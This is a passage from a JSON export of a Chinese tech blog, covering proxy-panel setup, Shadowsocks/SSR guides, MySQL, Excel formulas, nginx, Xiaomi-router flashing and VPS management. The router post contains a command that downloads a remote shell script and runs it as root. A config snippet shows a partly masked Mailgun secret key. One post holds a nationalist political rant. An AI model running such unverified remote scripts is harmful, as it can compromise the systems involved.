#异步发信查询引擎相关配置REDIS_HOST=127.0.0.1REDIS_PASSWORD=nullREDIS_PORT=6379MAIL_DRIVER=mailgun #这个地方原先是填smtp，laravel framework from 5.5 to 5.6后变更后填sendmail也行# 下面这坨只在配置smtp或sendmail时有用MAIL_HOST=smtp.mailgun.orgMAIL_PORT=587MAIL_USERNAME=发信用户名MAIL_PASSWORD=邮箱密码MAIL_ENCRYPTION=tlsMAIL_FROM_ADDRESS=发信邮箱MAIL_FROM_NAME=邮件标题MAILGUN_DOMAIN=sobaigu.com #mailgun配置的域名MAILGUN_SECRET=key-5673e708935axxxae32f0624c2 #mailgun账户的密钥，配私钥 mailgun发信有可能会抛 401 错误，详见 新版本使用队列进行邮件异步发送，相应的还需要执行 queue ，而且还带了查询引擎参数与 .env 中 QUEUE_DRIVER=redis 相关，所以如果和我示例中一致，还需要修改 queue 启动参数，也就是 queue.sh 中的内容，将其改成如下： 123456789#!/bin/bashps -ef | grep queue:work | grep -v grepif [ $? -ne 0 ]then echo &quot;start queue process successfully.....&quot; nohup php artisan queue:work redis --queue=default --timeout=60 --sleep=5 --tries=3 &gt;&gt; storage/logs/queue.log 2&gt;&amp;1 &amp;else echo &quot;queue is running.....&quot;fi 上面的脚本中，顺手将日志存放位置改了下，正常后看见日志如： 123[root@sobaigu logs]# tail -f queue.log [2019-02-16 22:04:29][z6Ig11U3jJ8MnE8EuedYXbTY3Boxxxxx] Processing: App\\Mail\\resetPassword[2019-02-16 22:04:30][z6Ig11U3jJ8MnE8EuedYXbTY3Boxxxxx] Processed: App\\Mail\\resetPassword 修改邮件模板内容 如果想让邮件内容和别人不一样，可以自己去更改邮件模板，基本模板文件在 app\\Mail 目录下，邮件正文也可以改 resources\\views\\emails 里面的文件，具体内容打开看就明白了，或者整个目录搜索自己想找的内容，然后按照自己需求更改即可。 限制单用户设备数 修改每个节点的 protocol 为 auth_chain_a，然后 把 protocol_param 设置为某个值，比如 3#，这样单用户最多就只能3个设备连接使用，请注意协议必须是 auth_chain_a 限制单连接或单用户速度 这个开发者说商业价值比较大，不会放出来，胖虎有点唬人，因为速度什么的根本不是面板控制的，面板只是管能不能连，回头把使用量做个记录。大致也是在节点上做文章，可自行去测试下节点用户配置： 12&quot;speed_limit_per_con&quot;: 0,&quot;speed_limit_per_user&quot;: 20480, 修改订阅地址长度 如果对此有强迫症，可以自己改代码 1/app/Http/Controllers/Controller.php 找到 makeSubscribeCode方法中 1$code = makeRandStr(5); #把5改成自己要的位数 购买服务提示：无可用服务 出现在新版面板上，新版已经不开源了，一些功能逻辑已经大变，此问题出现是因为商品没有配置 套餐 ，比如只有 流量包 ，而新版中砍掉了流量包售卖，所以添加 套餐 即可。 新版vnetpanel代码加密，很多逻辑只能猜，添加商品却默认是流量包，迷之烂尾，一直都没适应","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"免费酸酸乳，V2Ray账号获取方法","slug":"ssr-free","date":"2018-01-01T12:49:04.000Z","updated":"2022-01-01T12:49:04.000Z","comments":true,"path":"ssr-free.html","permalink":"https://sobaigu.com/ssr-free.html","excerpt":"","text":"前言 总有些需求，需要爬个梯子到外网去看看。 我们可以自己买个VPS，自己架设梯子服务，也可以去淘宝买个梯子账号。当然，只是偶尔用用，也可以去找个免费的资源用用，毕竟需求没那么多。 不得不说 Shadowsocks代理技术是好的，保证了我们的数据安全畅通，也让我们在当前现实环境下拥有了接触更多讯息的机会，这是好事。 但是，外面的世界并不像公知们宣传得那般岁月静好，看着看着就会发现： 轮子遗毒遍地，优点是还是那般无脑，辨识度很高 各种润物逢中必反 港台大殖子各种正常人意想不到的角度带节奏 欺师灭祖的废物们却要脸不红心不跳地教你要懂得尊重 自由，平等，契约精神……合则用，不合则弃 …… 各种言论为黑而黑，根本不顾事实与逻辑，水军铺天盖地目的只为恶心中国人。可以说是帝国主义亡我之心从来不死，所谓自由世界处处都存在着双重标准和白种人至上…… 不管因何种理由去外网闯荡，请时刻保持自己头脑清醒，不要让人轻易就洗脑被带节奏，时刻让自己有分清是非黑白的能力 不管身在何处，都别忘记自己是谁，从哪里来 毕竟，炎黄子孙出去能换衣裳但换不了皮，况且我们都深深地爱着自己的祖国 账号准备 以下说明是针对新用户小白的，已经有账号或者稍微会点的就可以直接跳过了。 要实现翻墙到外面的世界，我们需要个在墙外的梯子服务器，墙内的服务器是不具备这个功能的。所以，要么我们自己买墙外服务器，要么买墙外的翻墙服务即可。 服务提供商获取 相对于自建服务器，只要会使用客户端即可，服务器不需要自己维护，不需要什么技术门槛，而且价格普遍便宜一半。 免费注册账号 站长能找到的网站都取消免费额度了，想免费用的就不用去注册了。 首先，打开注册登录入口（或许有时不需要注册），按要求填写邮箱，邮箱会收到一个 6位数验证码 ，验证码和密码填好就注册完成了。 如果在 收件箱 里没发现验证码邮件，那就到 垃圾箱 里去找找，标记为 这不是垃圾邮件 上面的注册地址可能随时会失效，站长也没功夫经常跟踪查找，看到邮件提示以后就自助吧，一般有提示发送邮件到xxx，邮件主题：最新地址 需要邀请码？ 那就没办法了，估计人家是不想让你们去注册，换下一家或者自己去问问有没有邀请码提供。 这种资源在解放区都是触犯老爷们利益的，所以找到组织后记得满站找找联系方式，把能加的QQ，QQ群，微信，电报等等通通都加上，加收藏都不为过，反正加了又不要钱！ 节点信息 激活登录后，在首页或者从 节点列表 菜单进去即可看到使用教程和可用的梯子服务器节点信息。 一般按后台提供的教程配置即可，建议使用服务商提供的订阅节点功能，好处是服务商改了节点信息客户端会自动同步更新。 如果自己的客户端没有订阅节点功能，那么点击节点下方的二维码图标，即可用电脑客户端或者手机客户端扫描二维码自动完成配置。 如果不能扫描，那么点击节点地址即可看到服务器地址，端口，协议等信息，将其填入客户端对应位置即可，更多详细使用方法可见首页提示或者看这里的基础使用教程。 获得更多资源 默认注册后，每个账户有一定的初始免费流量，我们可以通过邀请其他人注册得到更多流量，也可以购买流量包：点击菜单『手机登录的话一般页面右上角有个〓图标』》购买服务，选择对应的套餐包，在线支付或者联系服务商购买充值码等方法完成充值完成充值后就可以使用了。 自建服务器 如果是买VPS自建梯子，那么需要你有一定的技术基础，能够部署服务端程序，买完VPS服务器后可以搜索相关教程折腾，折腾好了服务器那我们就有了客户端需要填的服务器账号密码等信息了。 自建梯子服务器说简单简单，说难也难，教程懒得写，自行使用搜索引擎。 免费不易，能用的随时都有可能阵亡，分享者吃力不讨好还要冒被喝茶的风险，建议还是谁用谁去搭吧。世界那么大，谁都想去看看，所以私有自用完全不用担心，只是要自己懂技术，然后自己承担服务器被封的风险，成本肯定要高不少，天下本就没有免费的午餐。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"SSR使用基础教程","slug":"how-to-use-ssr","date":"2017-12-30T08:28:58.000Z","updated":"2017-12-30T08:28:58.000Z","comments":true,"path":"how-to-use-ssr.html","permalink":"https://sobaigu.com/how-to-use-ssr.html","excerpt":"之前写过很多Shadowsocks客户端的基础使用教程，可还是有人说看不明白，可能是我教程写得不够详细吧…… 对于ShadowsocksR【酸酸乳】客户端，本来大同小异，都是汉字界面的客户端，还得专门出个图文教程，我尽量写得详尽些，照顾不到的自个儿琢磨去。","text":"之前写过很多Shadowsocks客户端的基础使用教程，可还是有人说看不明白，可能是我教程写得不够详细吧…… 对于ShadowsocksR【酸酸乳】客户端，本来大同小异，都是汉字界面的客户端，还得专门出个图文教程，我尽量写得详尽些，照顾不到的自个儿琢磨去。 认识酸酸乳 原版的Shadowsocks相对来说简单，也高效。ShadowsocksR作者和原版貌似还有点恩怨，但ShadowsocksR还是在原版基础上加了些东西，比如服务器统计，服务器负载均衡，使用订阅节点等。这里不讨论原版与酸酸乳孰优孰劣，我这里要写是因为我喜欢酸酸乳的负载均衡功能，原版的负载均衡貌似不怎么理想，设置订阅节点功能也适合小白买个账号使用。 正题：ShadowsocksR客户端长啥样 Windows用户比较多，这里以Windows版客户端举例，其他平台请见下文对应链接。 就长这样，也没啥特殊，带*号的是必填内容，这个获取账号的时候都会一并得到的。如果服务商提供的信息里没包含 协议 和混淆 两个配置项，那**请在协议那选择：origin ，混淆那选择：plain **即可。 下载ShadowsocksR客户端 ShadowsocksR系出于Shadowsocks，所以客户端基本上可以互相兼容，按自己的需求下载相应的客户端： ShadowsocksR-Windows版 Shadowsocks-windows版 Mac-苹果电脑 Linux系统 Android-shadowsocksr Android-shadowsocks IOS-苹果手机或平板 开始使用 安装启用 Shadowsocks客户端都是绿色版或者简单安装即可，Windows下客户端请解压到某文件夹下使用，如果报[初始化失败](/shadowsocks-faq.html#启动的时候提示：.NET Framework 初始化错误)，提示.net framwork版本过低请下载此官方安装包安装完再启动即可。 获取代理服务器账号 自有服务器 废话不多说，自己去买个VPS，装上Shadowsocks服务应用即可得到代理服务器账号了。 服务商账号 可以到免费账号网站注册即可得到免费体验的账号信息，登录后在首页可见自己账号可用的服务器节点，也可见自己的订阅地址。 什么？免费的节点少，慢？都免费给你用了还要啥自行车……自己去翻去点菜单，一般后台功能菜单都会有个 购买服务 ！！！ 手动配置服务器信息 如上网站免费注册后，可以在首页看到可用的节点，如上文所示，点击节点地址即得到自己账号信息，按信息填入或者选择客户端对应位置点确定即可。 订阅节点自动更新『推荐』 订阅地址：一个服务商提供的自动获取服务器节点的接口，客户端从该接口可以自动获取到账号对应的所有可用服务器节点信息并自动应用。当服务商更新服务器节点信息时，客户端更新订阅即可自动完成同步变更。 如果不是自己的服务器，买账号的都推荐用此方法，一般在服务商后台首页，有个明显提示获取 订阅节点 的地方，点击后得到一个地址，填入客户端的节点订阅设置即可。设置方法请点开前文图片看大图，图上有相关注释。 规则使用 规则有全局和PAC模式，如上图所示，全局就是不管什么连接都过代理，PAC则是在PAC规则中的连接才需要过代理，以此实现按需代理及节省服务器流量，详见：PAC模式和全局模式有什么区别 更多参考文档 Shadowsocks常见问题整理 萌新也看得懂的SSR功能详细介绍&amp;使用教程","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"怎么访问境外404网站 | 怎么变成美国IP等","slug":"how-to-connect-404-website","date":"2017-12-22T12:52:11.000Z","updated":"2017-12-22T12:52:11.000Z","comments":true,"path":"how-to-connect-404-website.html","permalink":"https://sobaigu.com/how-to-connect-404-website.html","excerpt":"","text":"前言 本来这种教程是完全不需要的，但还是有不少小白，丢出一句我想登录美国购物网站，我想访问非死不可,instagram登录不上……这都不是什么事，当你兴致勃勃地丢过去一个Shadowsocks这种简单高级货的时候，对面就又各种意想不到的问题丢过来，虽然也写了不少教程，各教程之间相互链接说的清清楚楚，可就是会被有效忽略！ 吃一堑长一智，遇到啥我就写啥，我一条条链接贴还不行嘛，反正是解释不清了。 小白的需求 小白的需求很简单，就是能访问打开世界上不存在的网站。但满足这个需求后，小白说不对，我要的不是这个…最后发现自己搞得焦头烂额，原来小白也不知道自己要什么。 小白觉得自己很无辜，做完需求后说被说不对的更是一脸懵逼。 那么，本文就将小白的简单需求复杂化，希望能看看，最后知道自己要什么。 归纳起来，无非就是这些需求： 能够访问被墙的网站，比如非死不可，油土鳖，还有一些境外的购物网站 获得境外IP，能够参与一些对客户有地域要求的活动，比如eBay，Amazon商家 其他一些目的隐藏自己的真实IP需要 登录外网的方式 要登录世界上不存在的网站，有两种方案： 自己电脑上挂代理，通过代理后不存在的网站就复活了 买个解放区外的VPS，系统装上视窗环境，自己电脑远程到VPS系统，这样就相当于你已经在VPS所在地了，然后在远程VPS桌面通过浏览器访问不存在的网站，参与eBay等都不是事儿。 利弊分析 以上两种方案，共同的基础是都需要有个在墙外面的VPS或者其他的服务器，而且自己的电脑能够畅通无阻地远程或者连接上。 代理方案 利：对vps要求低，只要装上Shadowsocks这种代理就行，网络流畅性能好，自然体验也好 弊：由于代理只是屏蔽的网络信息，自己电脑的系统，浏览器等信息还是自己电脑的，对某些对此有检测的应用将会暴露相关信息 远程桌面 利：相对于代理IP信息，远程桌面相当于所有的访问行为及特征都是远程电脑的，所有信息都跟本地电脑无关 弊：远程电脑桌面对网络稳定性要求较高，网络使用高峰期跨洋网络往往会出现偶尔丢包，此时就会感觉不流畅。而且，安装桌面环境要求较高的硬件配置，VPS购置成本会相应提高，一些检查较严格的应用，也能检测出非真实电脑 网络代理方式 要访问外网，要翻墙爬梯，要打开世界上不存在的网站，首选这种方案，成本低，见效快。 在所有的代理方案，VPN等方案中，首选Shadowsocks，性能好速度快，没有之一，本院在很多场合都表达过这个观点，见：Shadowsocks常见问题及使用方法整理 远程桌面方式 远程桌面大家用的比较多的是Windows远程桌面，也有像VNC，teamviewer等远程工具远程，具体某个软件的使用教程可以自行谷歌搜索，也可以看看：你的VPS怎么远程管理中相关部分","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"Linux系统下mysql命令行导入导出数据","slug":"linux-mysql-import-and-export-data","date":"2017-12-21T09:00:37.000Z","updated":"2017-12-21T09:00:37.000Z","comments":true,"path":"linux-mysql-import-and-export-data.html","permalink":"https://sobaigu.com/linux-mysql-import-and-export-data.html","excerpt":"在折腾数据库，导入导出数据是常事。虽然偷懒一直用的工具来做，但基本的命令用法还是做个笔记。","text":"在折腾数据库，导入导出数据是常事。虽然偷懒一直用的工具来做，但基本的命令用法还是做个笔记。 导出数据库用mysqldump命令 注意mysql的安装路径，即此命令的路径 导出数据和表结构 123mysqldump -u 用户名 -p 密码 数据库名 &gt; 数据库名.sql#下面是个示例mysqldump -uroot -p abc &gt; abc.sql 敲回车后会提示输入密码 只导出表结构 123mysqldump -u 用户名 -p 密码 -d 数据库名 &gt; 数据库名.sql#下面是个示例mysqldump -u root -p -d abc &gt; abc.sql 导入数据库 首先建空数据库 1mysql&gt;create database abc; 导入数据库 已经登录了mysql： 123456#选择数据库mysql&gt;use abc;#设置数据库编码mysql&gt;set names utf8;#导入数据（注意sql文件的路径）mysql&gt;source /home/abc/abc.sql; 未登录mysql一步到位导入： 123mysql -u 用户名 -p 密码 数据库名 &lt; 数据库名.sql#下面是个示例mysql -u abc_f -p abc &lt; abc.sql","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"一些有用的excel或WPS公式整理","slug":"useful-function-in-wps-excel","date":"2017-12-19T09:16:47.000Z","updated":"2017-12-19T09:16:47.000Z","comments":true,"path":"useful-function-in-wps-excel.html","permalink":"https://sobaigu.com/useful-function-in-wps-excel.html","excerpt":"在实际的工作中，总会用excel或者WPS表格处理些数据，将常用到的稍微需要动脑的公式整理了一下，很多公式可以组合使用，举一反三。","text":"在实际的工作中，总会用excel或者WPS表格处理些数据，将常用到的稍微需要动脑的公式整理了一下，很多公式可以组合使用，举一反三。 中间数字填充 表格中填充头部或者尾部的数字都很简单，或者某个部分唯一的数字也简单，鼠标一拉excel就会自动填充，但是如果在一串数字或者日期中，要填充中间的部分就不能自动了，比如1-1-1，需要填充成1-2-1，就需要用到下面的公式： 1=&quot;1-&quot;&amp;ROW(S1)&amp;&quot;-1&quot; “1-”双引号部分是固定字符，中间是填充部分。S1是随便选的一个列和行，表示从1开始填充。 参考链接 按条件查找出对应某列 1=VLOOKUP(F19,&#x27;VPS-201712&#x27;!$B$3:$Z$20,22,FALSE) 以上公式表示查找另一个表中B3-Z20区域内，与本表F19中内容相同的行，并返回从B列开始数的第22列内容，0或FALSE表示精确匹配，1或TRUE表示如果找不到则返回最接近F19值的那一个。 需要注意的事，条件匹配列需要放在最左侧，不能匹配右侧的条件去查找左侧列值。 参考链接 条件判断汇总计算 应用场景是将匹配某条件的所有值汇总计算，公式如下： 1=SUMIF($A:$I,$M3,D:D) 在A-I列范围内，如果匹配$M3，则sum(D:D)，不匹配的就不会参与计算。 参考链接 自动计算下个月或者下年日期 有个需求是，填上首购时间和付款周期，自动计算下次到期日期。 1=IF(B14=&quot;月付&quot;,EDATE(A14-1,1*C14),EDATE(A14-1,1*12)) A列填上首购日期，如果B列是月付，那么到期日期列就自动计算出C列指定的月份后的A列前一日，否则就是下一年的今日。","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"centOS使用yum命令安装nginx ","slug":"Linux-yum-install-nginx","date":"2017-12-18T07:37:38.000Z","updated":"2017-12-18T07:37:38.000Z","comments":true,"path":"Linux-yum-install-nginx.html","permalink":"https://sobaigu.com/Linux-yum-install-nginx.html","excerpt":"一般都用LNMP之类的一键安装脚本编译安装nginx，但个别服务器我只需要nginx就够了。 直接通过 yum install nginx 肯定是不行的,因为yum没有nginx，所以首先把 nginx 的源加入 yum 中。","text":"一般都用LNMP之类的一键安装脚本编译安装nginx，但个别服务器我只需要nginx就够了。 直接通过 yum install nginx 肯定是不行的,因为yum没有nginx，所以首先把 nginx 的源加入 yum 中。 将nginx放到yum repro库中 12345# centos7rpm -ivh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm# centos6rpm -ivh http://nginx.org/packages/centos/6/noarch/RPMS/nginx-release-centos-6-0.el6.ngx.noarch.rpm 查看nginx信息：yum info nginx 使用yum安装ngnix：yum install nginx 启动nginx：service nginx start 查看nginx版本：nginx -v 访问nginx 现在你可以通过公网ip (本地可以通过 localhost /或 127.0.0.1 ) 查看nginx 服务返回的信息。默认网站使用curl -i localhost命令返回效果如下： 1Welcome to nginx! nginx配置文件位置在/etc/nginx/","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"小米路由器mini安装Shadowsocks，实现全设备免客户端自动翻墙","slug":"xiaomi-router-mini-with-shadowsocks","date":"2017-12-17T14:34:00.000Z","updated":"2017-12-17T14:34:00.000Z","comments":true,"path":"xiaomi-router-mini-with-shadowsocks.html","permalink":"https://sobaigu.com/xiaomi-router-mini-with-shadowsocks.html","excerpt":"一直用的Shadowsocks作为梯子工具，自己买个VPS做梯子服务器，私用稳定且性能良好，看油土鳖1080P毫无压力。但手机和电脑都要安装对应客户端，刚好有空折腾下路由，在路由上安装梯子后，手机或者电脑就不需要再启动Shadowsocks®客户端了，只要在这个路由下的设备就自动爬上了梯子，一举多得。","text":"一直用的Shadowsocks作为梯子工具，自己买个VPS做梯子服务器，私用稳定且性能良好，看油土鳖1080P毫无压力。但手机和电脑都要安装对应客户端，刚好有空折腾下路由，在路由上安装梯子后，手机或者电脑就不需要再启动Shadowsocks®客户端了，只要在这个路由下的设备就自动爬上了梯子，一举多得。 路由刷开发版系统 只有开发版系统才能开启SSH权限，所以第一步我们需要将路由器系统刷为开发版。 到小米路由官网去下载开发版系统ROM，建议直接刷这个版本小米路由器mini MiWiFi 开发版 0.8.11 非常重要，如果版本高了，不能开启SSH，版本低了没有修改root用户的api。 刷入开发版非常简单，步骤如下： 将上面下载好的固件改名为：miwifi.bin ，放入一个U盘的根目录，U盘需要是 FAT32 格式 U盘插到路由屁股上，拿根取卡针等尖头物件顶住 reset ，然后插入电源 路由器指示灯先会常亮黄色，等指示灯狂闪后就可以松开 reset 了，然后静候路由器指示灯变成蓝色 以上做完就完成刷入开发版的步骤了。如果指示灯是红色，那么代表这个固件有问题，重新更换固件，断电再走一遍流程就可以了，不用担心会变砖。 开启SSH权限 系统刷好开发版后，我们就可以开启系统的SSH权限了。开启SSH权限，需要登录官方网站下载对应的工具包： 请将下载的工具包 bin 文件复制到U盘（FAT/FAT32 格式）的根目录下，保证文件名为 miwifi_ssh.bin 「如果之前刷开发版用的同一个U盘，那之前放的 miwifi.bin 删除掉不需要多说吧？」； 断开小米路由器的电源，将U盘插入USB接口； 抵住 reset 按钮之后重新插上电源，指示灯变为黄色闪烁状态即可松开 reset 键； 等待3-5秒后安装完成之后，小米路由器会自动重启 官方给每个账号提供了一个随机的root密码，为了管理方便，我们可以登录后用 passwd 命令将root密码改成我们自己好记得的 刷完 miwifi_ssh.bin 后，我们可以用Xshell等SSH客户端连接登录路由器，Windows上的SSH客户端见： Xshell-Windows平台上优秀的 SSH 客户端， 全能的远程管理工具：MobaXterm， Linux等系统可以使用putty，secureCRT等都可以。 安装Misstar Tools 如果不需要小米的手机APP管理路由功能，建议直接刷openwrt等系统 ，功能更全，可玩性更高，可参考：小米路由器mini刷openwrt系统。 你当然可以直接用Shell客户端安装你要的应用，但后续还有配置等问题，所以建议安装Misstar Tools实现界面化设置，还可以安装其他的插件，比如去广告之类，具体安装完后自己登录路由管理界面去看。 在SSH客户端界面输入以下命令安装： 12wget http://www.misstar.com/tools/appstore/install.sh -O /tmp/install.shchmod +x /tmp/install.sh &amp;&amp; /tmp/install.sh 安装Shadowsocks插件 安装完Misstar Tools后，登录路由器管理后台，可见多了MT工具箱菜单。由于某些力量压力，软件作者更新最新插件管理后在界面上却找不到Shadowsocks，但该插件还是存在的，我们需要通过其他方法恢复安装。 改网页源码安装 谷歌浏览器打开插件管理页，按F12调出开发者工具，点击元素选择工具选中任意一个安装，会自动定位到该功能对应代码段，大概是下面这样子： 1&lt;a href=&quot;javascript:;&quot; style=&quot;top: 15px;&quot; class=&quot;layui-btn layui-btn-big&quot; id=&quot;aliddns&quot; data-type=&quot;add&quot;&gt;&lt;i class=&quot;layui-icon&quot;&gt;&lt;/i&gt;安装&lt;/a&gt; 上面的代码是我选了Aliddns这个插件的安装按钮，可见其id=&quot;aliddns&quot;，我们双击此处将此改成：id=&quot;ss&quot;，保存不要刷新页面，点击安装按钮静候安装完成即可看到一个科学上网了。 命令行安装 SSH登录到路由，然后运行以下命令： 1/etc/misstar/scripts/appmanager add ss 安装完成后刷新插件界面，应该可以看到一个科学上网了。 配置梯子服务器 点击科学上网插件就进入了设置页，梯子服务器在这个配置界面里表述为节点列表，所以我们可以手动或者从配置文件导入我们的梯子服务器信息。 配置好后，点击连接，成功的话在顶部的工作状态就显示了你连接的服务器了，同时连接在该路由下的所有设备都自带爬墙功能。 参考文档 Misstar Tools 2017新版工具箱发布 小米路由器一键安装Shadowsocks教程","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"你的VPS怎么远程管理","slug":"how-to-manage-vps","date":"2017-12-13T13:35:42.000Z","updated":"2017-12-13T13:35:42.000Z","comments":true,"path":"how-to-manage-vps.html","permalink":"https://sobaigu.com/how-to-manage-vps.html","excerpt":"","text":"VPS是什么这里就不普及了，就当成是一个一直开着的虚拟机系统，这个虚拟机你也只能通过网络远程管理，有些供应商会提供系统重装面板，或者提供VNC远程监视。 以下所述都指的直接远程VPS系统操作。 Windows系统 大家最常用的就是Windows系统了，也都轻车熟路，如果VPS安装的是Windows系统，那么通过Windows系统自带的远程桌面即可远程连接：开始》程序》Windows附件》远程桌面连接 或者直接 按win+R组合快捷》输入：mstsc 启动远程桌面管理程序，填入系统的账号『一般是administrator』、密码即可，不再赘述。 当然，在此也非常推荐Remote Desktop Organizer这款Windows远程桌面工具，尤其是大批量远程管理使用。 使用时需要注意的是，因为安全的需求，一般Windows远程都会勾选“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”，所以在使用RDO新建远程桌面时，远程桌面设置中请勾选这个选项 Advanced&gt;Enable Credential Security Support Provider。 当然，如果你在VPS系统里装上VNC，teamviewer等工具，也可以在任何地方任何平台用对应的客户端远程控制你的VPS系统。 Linux系统 Linux系统一般没桌面环境，所以基本上是使用Shell客户端进行远程管理的。VPS提供商一般会给你提供SSH登录信息： 1234Your VPS details are :Username : rootRoot Password : xxxIP(s) : xx.xx.xx.xx 如果没给端口，那么就是默认的22端口，有提供其他端口的话请在登录时除了填系统账号密码，还需要选择或者填写对应的端口才可以。 之前特意做了个视频教程，自己看吧。如果不清晰就到youku去看 当然，如果不介意资源消耗，Linux也可以安装视窗软件，安装教程可见：给Linux系统安装桌面环境 安装桌面环境后，可以通过teamviewer，vncviewer等远程工具管理你的Linux桌面系统，同时SSH客户端仍然可以正常管理使用。 VNC监视 VNC是用来控制Windows或者Linux远程桌面的，装在VPS系统里就可以控制VPS，装在母鸡里则可以监视VPS显示屏，而这里说的VNC监视指监视VPS显示屏的功能。 123The VNC details are :VNC Details : 202.91.xx.xx:xxxxVNC Password : xxxxx 一般开通VPS的时候都会提供VPS系统本身的信息，还会有个VNC信息，就是用来监视VPS系统的，通过这个VNC，你可以知道VPS当前是关机还是开机状态，而不用登录到VPS系统里面。当然，这个远程流程是：你的电脑→宿主机→VPS系统，这种模式操作肯定是有卡顿的，所以一般只是拿来当监视用，比如用来首次开启VPS系统远程桌面，看看系统有没有死机，VPS网络是不是不通等。要流畅管理VPS系统，还请在开启远程或者SSH后，直接登录系统里的远程。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"给Linux系统安装桌面环境","slug":"linux-desktop","date":"2017-12-01T11:46:01.000Z","updated":"2017-12-01T11:46:01.000Z","comments":true,"path":"linux-desktop.html","permalink":"https://sobaigu.com/linux-desktop.html","excerpt":"CentOS 作为服务器的操作系统是很常见的，但是因为需要稳定而没有很时髦的更新，所以很少做为桌面环境。在服务器上通常不需要安装桌面环境，最小化地安装 CentOS（也就是 minimal CentOS） 就可以了。不过在最小化安装的 CentOS 中通过 YUM 来安装桌面环境也是非常方便的。","text":"CentOS 作为服务器的操作系统是很常见的，但是因为需要稳定而没有很时髦的更新，所以很少做为桌面环境。在服务器上通常不需要安装桌面环境，最小化地安装 CentOS（也就是 minimal CentOS） 就可以了。不过在最小化安装的 CentOS 中通过 YUM 来安装桌面环境也是非常方便的。 确认桌面环境软件包 用yum grouplist查询支持的软件包，软件包列表根据系统使用的语言来显示，支持简体中文文件名。所以安装前最好用上述指令查询一下看看。如果系统使用了简体中文，而安装指令使用英文，可能会导致查询不到软件包这样的错误。 对于 CentOS 6，Desktop、Desktop Platform、KDE Desktop、X Window System 是主要的桌面环境 对于 CentOS 7，有 KDE Plasma Workspaces 和 Gnome Desktop 两大桌面环境 安装桌面视窗环境 CENTOS 7 CentOS 7 上的桌面环境安装包组合进行了调整，比以前要简单了。主要有两大阵营，KDE 和 GNOME。 要安装 KDE 桌面环境： 1# yum groupinstall &quot;KDE Plasma Workspaces&quot; 要安装 GNOME 环境： 1# yum groupinstall &quot;GNOME Desktop&quot; 安装程序会自动解决安装包和组件的依赖关系。 CENTOS 6 要安装 KDE 桌面环境，执行指令 1# yum groupinstall &quot;X Window System&quot; &quot;KDE Desktop&quot; Desktop 即可，同时安装了 3 个软件包。注意，因为 KDE Desktop 和 X Window System 两个软件包名称中间都包含空格，需要用引号引起来才行。 要安装 Gnome 桌面环境，执行指令 1# yum groupinstall &quot;X Window System&quot; &quot;Desktop Platform&quot; Desktop 即可，也是同时安装了 3 个软件包，其中 X Window System 是必须的，不管是 Gnome 还是 KDE。 既然是桌面环境，可能还需要诸如字体、管理工具之类的，如 12345# yum -y install tigervnc-server# yum -y groupinstall &quot;Graphical Administration Tools&quot;# yum -y groupinstall &quot;Internet Browser&quot;# yum -y groupinstall &quot;General Purpose Desktop&quot;# yum -y install nautilus-open-terminal #右键菜单 启用 从命令行直接启动图形桌面环境，用这个命令：startx 这样就会启动默认的 Gnome 或者 KDE 桌面环境。如果有人喜欢同时安装 GNOME 和 KDE，切换方法可以参考 CentOS 文档。 如果希望启动时自动启动到图形桌面，需要修改启动配置。因为 CentOS 7 开始使用 systemd 管理器，其操作方式与之前版本有所不同。 CENTOS 7 CentOS 7 中直接使用 systemd 指令修改启动目的状态即可。 使用systemctl get-default可以查询到当前所设定的状态。multi-user.target 相当于以前的 level 3，也就是命令行终端；而 graphical.target 相当于以前的 level 5，也就是图形界面。 所以如果要设置默认启动到图形界面，则执行 1# systemctl set-default graphical.target CENTOS 6 等 编辑 /etc/inittab，将 id:3:initdefault: 改为 id:5:initdefault:。（请注意这里的英文半角冒号。）参考这里。 直接用 sed 会很方便， 1sed -i &#x27;s/id:3:initdefault:/id:5:initdefault:/&#x27; /etc/inittab 启动图形界面后，如果希望从图形界面切换到命令行界面，可以用 Ctrl + Alt + F6（实际上 F1 到 F6 